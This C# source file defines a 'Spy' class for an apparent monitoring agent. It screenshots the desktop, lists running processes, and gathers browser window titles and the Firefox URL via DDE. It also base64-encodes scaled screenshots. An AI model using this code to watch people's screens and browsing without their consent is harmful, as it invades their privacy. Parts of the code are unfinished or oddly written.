using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.IO;
using System.Windows;
using NDde.Client;

namespace CompSpyAgent
{
    class Spy
    {
        public Bitmap bmp;
        public Graphics zrzut;

        public Process[] listaProcesow;
        public List<String> listaStron;
        public bool automatycznie;
        public int czasAutomatycznie;
        public DateTime czasOst;
        
            public Spy()
        {
            bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
            zrzut = Graphics.FromImage(bmp);

            listaStron = new List<String>();

            automatycznie = false;
            czasAutomatycznie = 30;
            czasOst = DateTime.Now;

            Thread watek = new Thread(() =>
            {
                TimeSpan ts = DateTime.Now - czasOst;
                //if (TimeSpan.Compare()) ;
            }
            );
            watek.Start();

        }     


        
        public void Aktualizacja()
        {
            

            zrzut.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

            listaProcesow = Process.GetProcesses();

            //aktualizacja otwartych stron
            listaStron.Clear();
            getURLfirefox();

            foreach(var p in listaProcesow)
            {
                if(Convert.ToString(p.ProcessName) == "chrome")
                {
                    if(p.MainWindowTitle != "" || p.MainWindowTitle == " ")
                    {
                        listaStron.Add("[chrome]");
                        listaStron.Add("Title: " + p.MainWindowTitle);
                    }
                   
                }

                if (Convert.ToString(p.ProcessName) == "opera")
                {
                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
                    {
                        listaStron.Add("[opera]");
                        listaStron.Add("Title: " + p.MainWindowTitle);
                    }
                }

                if (Convert.ToString(p.ProcessName) == "iexplore")
                {
                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
                    {
                        listaStron.Add("[iexplore]");
                        listaStron.Add("Title: " + p.MainWindowTitle);
                    }
                }

                if (Convert.ToString(p.ProcessName) == "MicrosoftEdge")
                {
                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
                    {
                        listaStron.Add("[MicrosoftEdge]");
                        listaStron.Add("Title: " + p.MainWindowTitle);
                    }
                }


            }




        } 
        public void getURLfirefox()
        {
            try
            {
                DdeClient dde = new DdeClient("firefox", "WWW_GetWindowInfo");
                dde.Connect();
                string url = dde.Request("URL", int.MaxValue);
               string[] urls = url.Split(new string[] { ",", "\"" }, StringSplitOptions.RemoveEmptyEntries);
                dde.Disconnect();

                listaStron.Add("[firefox]");
                listaStron.Add("URL: " + urls[0]);
                listaStron.Add("Title: " + urls[1]);

            }
            catch
            {

            }
        }


        public void getZrzut(PictureBox p)
        {
            p.Image = bmp;
        }

        public Bitmap getHQScreen()
        {
           Bitmap img = new Bitmap(bmp, new Size(960, 540)); // 1/2 zdjecia
            return img;
        }

        public Bitmap getLQScreen()
        {
            Bitmap img = new Bitmap(bmp, new Size(240, 135)); // 1/8 zdjecia
            return img;
        }
        public String getImageBase64(Bitmap img)
        {
            using (System.Drawing.Image img2 = img)
            {
                using (MemoryStream m = new MemoryStream())
                {
                    img2.Save(m, img.RawFormat);
                    byte[] bytes = m.ToArray();
                    return Convert.ToBase64String(bytes);
                }
            }
    }

        public void getListaProcesow(ListView lw)
        {
            lw.Items.Clear();

            foreach(var p in listaProcesow)
            {
                lw.Items.Add(p.ProcessName);
            }
        }

        public void getListaStron(ListView lw)
        {
            lw.Items.Clear();
            foreach(var p in listaStron)
            {
                lw.Items.Add(p);
            }
        }
    }
}
